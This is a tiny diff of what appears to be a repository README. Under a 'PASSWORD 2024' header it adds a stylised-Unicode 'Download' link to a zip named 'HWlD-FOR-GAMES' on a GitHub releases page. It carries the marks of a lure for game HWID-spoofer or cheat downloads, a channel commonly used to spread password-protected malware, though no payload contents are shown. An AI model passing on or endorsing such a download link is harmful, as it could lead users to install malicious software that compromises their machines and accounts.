@@ -2,7 +2,7 @@
 
 # PASSWORD 2024 
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/x6tenze/HWlD-FOR-GAMES-/releases/download/HWlD-FOR-GAMES/HWlD-FOR-GAMES.zip)
 
 
 
